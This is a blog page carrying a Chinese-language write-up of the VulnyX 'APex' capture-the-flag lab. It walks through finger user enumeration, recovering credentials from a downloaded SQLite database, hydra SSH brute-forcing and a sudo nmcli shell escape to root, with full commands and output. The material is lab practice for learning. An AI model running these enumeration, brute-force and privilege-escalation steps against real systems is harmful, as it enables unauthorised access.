+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/40" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>nyx_APex</h1>
+<h1>0.简介</h1>
+<p><strong>靶机</strong>：<a href="https://vulnyx.com/file/APex.php" rel="nofollow">vulnyx - APex</a><br>
+<strong>难度</strong>：Easy<br>
+<strong>目标 IP</strong>：192.168.205.148<br>
+<strong>本机 IP</strong>：192.168.205.141</p>
+<h1>1.扫描</h1>
+<p><code class="notranslate">nmap</code>起手</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.148
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 19:17 CST
+Nmap scan report for 192.168.205.148
+Host is up (0.00026s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+79/tcp open  finger
+80/tcp open  http
+MAC Address: 08:00:27:8E:D9:36 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds
+
+</code></pre>
+<p>其中79是我没有见过的服务，优先级最高</p>
+<h1>2.踩点</h1>
+<p>在hacktricks搜索到了相关<a href="https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html#79---pentesting-finger" rel="nofollow">网页</a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a"><img src="https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a" alt="Image" style="max-width: 100%;"></a></p>
+<p>有Metasploit的脚本，我们优先利用一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ msfconsole
+msf6 <span class="pl-k">&gt;</span> use auxiliary/scanner/finger/finger_users
+msf6 auxiliary(scanner/finger/finger_users) <span class="pl-k">&gt;</span> show options 
+
+Module options (auxiliary/scanner/finger/finger_users):
+
+   Name        Current Setting                        Required  Description
+   ----        ---------------                        --------  -----------
+   RHOSTS                                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metas
+                                                                ploit/basics/using-metasploit.html
+   RPORT       79                                     yes       The target port (TCP)
+   THREADS     1                                      yes       The number of concurrent threads (max one per host)
+   USERS_FILE  /usr/share/metasploit-framework/data/  yes       The file that contains a list of default UNIX accounts.
+               wordlists/unix_users.txt
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/finger/finger_users) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> RHOSTS 192.168.205.148
+RHOSTS =<span class="pl-k">&gt;</span> 192.168.205.148
+msf6 auxiliary(scanner/finger/finger_users) <span class="pl-k">&gt;</span> run
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: _apt
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: backup
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: bin
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: daemon
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: dnsmasq
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: games
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: gnats
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: irc
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: list
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: lp
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: mail
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: man
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: messagebus
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: news
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: nobody
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: proxy
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: root
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sshd
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sync
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sys
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-coredump
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-network
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-resolve
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-timesync
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uucp
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uuidd
+[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: www-data
+[+] 192.168.205.148:79    - 192.168.205.148:79 Users found: _apt, backup, bin, daemon, dnsmasq, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, proxy, root, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, uucp, uuidd, www-data
+[<span class="pl-k">*</span>] 192.168.205.148:79    - Scanned 1 of 1 hosts (100% complete)
+[<span class="pl-k">*</span>] Auxiliary module execution completed
+</pre></div>
+<p>提取数据进行爆破</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ cat user <span class="pl-k">|</span>awk -F <span class="pl-s"><span class="pl-pds">'</span>: <span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $2}<span class="pl-pds">'</span></span>
+_apt
+backup
+bin
+daemon
+dnsmasq
+games
+gnats
+irc
+list
+lp
+mail
+man
+messagebus
+news
+nobody
+proxy
+root
+sshd
+sync
+sys
+systemd-coredump
+systemd-network
+systemd-resolve
+systemd-timesync
+uucp
+uuidd
+www-data
+┌──(kali㉿kali)-[~/test]
+└─$ <span class="pl-k">while</span> <span class="pl-c1">read</span> -r user<span class="pl-k">;</span> <span class="pl-k">do</span> <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$user</span><span class="pl-pds">"</span></span> <span class="pl-k">|</span> nc -vn 192.168.205.148 79<span class="pl-k">;</span> <span class="pl-k">done</span> <span class="pl-k">&lt;</span> user
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: _apt                             Name: 
+Directory: /nonexistent                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: backup                           Name: backup
+Directory: /var/backups                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: bin                              Name: bin
+Directory: /bin                         Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: daemon                           Name: daemon
+Directory: /usr/sbin                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: dnsmasq                          Name: dnsmasq
+Directory: /var/lib/misc                Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: games                            Name: games
+Directory: /usr/games                   Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: gnats                            Name: Gnats Bug-Reporting System (admin)
+Directory: /var/lib/gnats               Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: irc                              Name: ircd
+Directory: /run/ircd                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: list                             Name: Mailing List Manager
+Directory: /var/list                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: lp                               Name: lp
+Directory: /var/spool/lpd               Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: mail                             Name: mail
+Directory: /var/mail                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: man                              Name: man
+Directory: /var/cache/man               Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: messagebus                       Name: 
+Directory: /nonexistent                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: news                             Name: news
+Directory: /var/spool/news              Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: nobody                           Name: nobody
+Directory: /nonexistent                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: proxy                            Name: proxy
+Directory: /bin                         Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: root                             Name: root
+Directory: /root                        Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: sshd                             Name: 
+Directory: /run/sshd                    Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: sync                             Name: sync
+Directory: /bin                         Shell: /bin/sync
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: sys                              Name: sys
+Directory: /dev                         Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: systemd-coredump                 Name: systemd Core Dumper
+Directory: /                            Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: systemd-network                  Name: systemd Network Management
+Directory: /run/systemd                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: systemd-resolve                  Name: systemd Resolver
+Directory: /run/systemd                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: systemd-timesync                 Name: systemd Time Synchronization
+Directory: /run/systemd                 Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: uucp                             Name: uucp
+Directory: /var/spool/uucp              Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: uuidd                            Name: 
+Directory: /run/uuidd                   Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Login: www-data                         Name: www-data
+Directory: /var/www                     Shell: /usr/sbin/nologin
+Never logged in.
+No mail.
+No Plan.
+</pre></div>
+<p>没有有意思的东西，我们去看看Web服务吧</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b"><img src="https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b" alt="Image" style="max-width: 100%;"></a></p>
+<p>没有有意思的东西，源码也没有，我们去爆破目录</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ gobuster dir -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.148<span class="pl-pds">"</span></span> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) <span class="pl-k">&amp;</span> Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.205.148
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,md,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster <span class="pl-k">in</span> directory enumeration mode
+===============================================================
+/backup               (Status: 401) [Size: 462]
+/index.html           (Status: 200) [Size: 878]
+/server-status        (Status: 403) [Size: 280]
+/.html                (Status: 403) [Size: 280]
+</pre></div>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7"><img src="https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7" alt="Image" style="max-width: 100%;"></a></p>
+<p>好像找到重点了，扫描一下架构</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nuclei -u 192.168.205.148                      
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ <span class="pl-cce">\/</span> / / / ___/ / _ <span class="pl-cce">\/</span> /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/<span class="pl-cce">\_</span>_,_/<span class="pl-cce">\_</span>__/_/<span class="pl-cce">\_</span>__/_/   v3.3.8
+
+                projectdiscovery.io
+
+[WRN] Found 2 templates with runtime error (use -validate flag <span class="pl-k">for</span> further examination)
+[INF] Current nuclei version: v3.3.8 (latest)
+[INF] Current nuclei-templates version: v10.1.2 (latest)
+[WRN] Scan results upload to cloud is disabled.
+[INF] New templates added <span class="pl-k">in</span> latest release: 52
+[INF] Templates loaded <span class="pl-k">for</span> current scan: 7656
+[INF] Executing 7276 signed templates from projectdiscovery/nuclei-templates
+[WRN] Loading 380 unsigned templates <span class="pl-k">for</span> scan. Use with caution.
+[INF] Targets loaded <span class="pl-k">for</span> current scan: 1
+[INF] Running httpx on input host
+[INF] Found 1 URL from httpx
+[INF] Templates clustered: 1698 (Reduced 1598 Requests)
+[INF] Using Interactsh Server: oast.fun
+[waf-detect:apachegeneric] [http] [info] http://192.168.205.148
+[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.148:22
+[ssh-server-enumeration] [javascript] [info] 192.168.205.148:22 [<span class="pl-s"><span class="pl-pds">"</span>SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3<span class="pl-pds">"</span></span>]
+[ssh-password-auth] [javascript] [info] 192.168.205.148:22
+[ssh-auth-methods] [javascript] [info] 192.168.205.148:22 [<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-pds">"</span></span>publickey<span class="pl-s"><span class="pl-pds">"</span>,<span class="pl-pds">"</span></span>password<span class="pl-s"><span class="pl-pds">"</span>]<span class="pl-pds">"</span></span>]
+[openssh-detect] [tcp] [info] 192.168.205.148:22 [<span class="pl-s"><span class="pl-pds">"</span>SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3<span class="pl-pds">"</span></span>]
+[options-method] [http] [info] http://192.168.205.148 [<span class="pl-s"><span class="pl-pds">"</span>HEAD,GET,POST,OPTIONS<span class="pl-pds">"</span></span>]
+[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.148
+[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.148
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.148
+[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.148
+[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.148
+[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.148
+[apache-detect] [http] [info] http://192.168.205.148 [<span class="pl-s"><span class="pl-pds">"</span>Apache/2.4.62 (Debian)<span class="pl-pds">"</span></span>]
+</pre></div>
+<p>无果，拷一份网站下来，还是没有东西。仔细想想好像就只有那个法老有特色了，搜一下</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e"><img src="https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e" alt="Image" style="max-width: 100%;"></a></p>
+<p>等会，不会是在那个79服务看这个人的信息吧</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nc -vn 192.168.205.148 79
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+Horus
+finger: Horus: no such user.
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ nc -vn 192.168.205.148 79
+(UNKNOWN) [192.168.205.148] 79 (finger) open
+horus      
+Login: horus                            Name: 
+Directory: /home/horus                  Shell: /bin/bash
+Never logged in.
+Mail forwarded to horus@point.nyx
+No mail.
+PGP key:
+personal notes: H0Ru<span class="pl-smi">$$</span>3rv3
+No Plan.</pre></div>
+<p>我去.....</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa"><img src="https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa" alt="Image" style="max-width: 100%;"></a></p>
+<p>下载下来看看</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ sqlite3 <span class="pl-k">~</span>/Downloads/database.db 
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter <span class="pl-s"><span class="pl-pds">"</span>.help<span class="pl-pds">"</span></span> <span class="pl-k">for</span> usage hints.
+sqlite<span class="pl-k">&gt;</span> .tables
+users
+sqlite<span class="pl-k">&gt;</span> <span class="pl-k">select</span> <span class="pl-smi">*</span> from users
+   ...<span class="pl-k">&gt;</span> <span class="pl-k">;</span>
+1<span class="pl-k">|</span>anubis<span class="pl-k">|</span>L44NxKRnP7wxrBsxibpDORySkbEHRO
+2<span class="pl-k">|</span>amon<span class="pl-k">|</span>xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
+3<span class="pl-k">|</span>seth<span class="pl-k">|</span>Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
+4<span class="pl-k">|</span>osiris<span class="pl-k">|</span>ITA96l3isg4uV2Sm8eYn41XVfxprFy</pre></div>
+<p>尝试爆破</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ cat tmp<span class="pl-k">|</span>awk -F <span class="pl-s"><span class="pl-pds">'</span>|<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $2}<span class="pl-pds">'</span></span>
+anubis
+amon
+seth
+osiris
+
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat tmp<span class="pl-k">|</span>awk -F <span class="pl-s"><span class="pl-pds">'</span>|<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $2}<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> user
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat user      
+anubis
+amon
+seth
+osiris
+
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat tmp<span class="pl-k">|</span>awk -F <span class="pl-s"><span class="pl-pds">'</span>|<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $3}<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> pass
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat pass                            
+L44NxKRnP7wxrBsxibpDORySkbEHRO
+xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
+Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
+ITA96l3isg4uV2Sm8eYn41XVfxprFy
+
+                                      </pre></div>
+<p>hydra启动</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ hydra -L user -P pass ssh://192.168.205.148 -I -u -f -e nsr -t 64 
+Hydra v9.5 (c) 2023 by van Hauser/THC <span class="pl-k">&amp;</span> David Maciejak - Please <span class="pl-k">do</span> not use <span class="pl-k">in</span> military or secret service organizations, or <span class="pl-k">for</span> illegal purposes (this is non-binding, these <span class="pl-k">***</span> ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-22 19:49:56
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 40 tasks per 1 server, overall 40 tasks, 40 login tries (l:5/p:8), <span class="pl-k">~</span>1 try per task
+[DATA] attacking ssh://192.168.205.148:22/
+[22][ssh] host: 192.168.205.148   login: seth   password: xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 19:49:58
+</pre></div>
+<p>登录</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ ssh seth@192.168.205.148     
+The authenticity of host <span class="pl-s"><span class="pl-pds">'</span>192.168.205.148 (192.168.205.148)<span class="pl-pds">'</span></span> can<span class="pl-s"><span class="pl-pds">'</span>t be established.</span>
+<span class="pl-s">ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.</span>
+<span class="pl-s">This key is not known by any other names.</span>
+<span class="pl-s">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="pl-s">Warning: Permanently added <span class="pl-pds">'</span></span>192.168.205.148<span class="pl-s"><span class="pl-pds">'</span> (ED25519) to the list of known hosts.</span>
+<span class="pl-s">seth@192.168.205.148<span class="pl-pds">'</span></span>s password: 
+seth@apex:<span class="pl-k">~</span>$ id
+uid=1001(seth) gid=1001(seth) grupos=1001(seth)
+</pre></div>
+<h1>3.提权</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">seth@apex:<span class="pl-k">~</span>$ sudo -l
+-bash: sudo: orden no encontrada
+seth@apex:<span class="pl-k">~</span>$ which sudo
+seth@apex:<span class="pl-k">~</span>$ cat /etc/sudo
+sudo.conf          sudoers            sudoers.d/         sudo_logsrvd.conf  
+seth@apex:<span class="pl-k">~</span>$ cat /etc/sudoers
+cat: /etc/sudoers: Permiso denegado
+seth@apex:<span class="pl-k">~</span>$ /etc/sudo -l
+-bash: /etc/sudo: No existe el fichero o el directorio
+seth@apex:<span class="pl-k">~</span>$ find / -name sudo <span class="pl-k">2&gt;</span>/dev/null
+/var/lib/sudo
+/etc/init.d/sudo
+/etc/pam.d/sudo
+/run/sudo
+/usr/sbin/sudo
+/usr/share/lintian/overrides/sudo
+/usr/share/bash-completion/completions/sudo
+/usr/share/doc/sudo
+/usr/lib/sudo
+seth@apex:<span class="pl-k">~</span>$ /run/sudo -l
+-bash: /run/sudo: Es un directorio
+seth@apex:<span class="pl-k">~</span>$ /usr/sbin/sudo -l
+Matching Defaults entries <span class="pl-k">for</span> seth on apex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+
+User seth may run the following commands on apex:
+    (root) NOPASSWD: /usr/bin/nmcli
+</pre></div>
+<p>还真有人干这事啊，然后我就卡住了。等到8点群里大佬发了wp我才发现又是缩小提权</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3"><img src="https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3" alt="Image" style="max-width: 100%;"></a></p>
+<p>在城南花已开大佬的wp看到了原理：</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8"><img src="https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8" alt="Image" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">!</span>/bin/bash
+root@apex:/home/seth# iduid=0(root) gid=0(root) grupos=0(root)</pre></div>
+<p>以下也是大佬的思路</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126"><img src="https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126" alt="Image" style="max-width: 100%;"></a></p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Blog Title</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 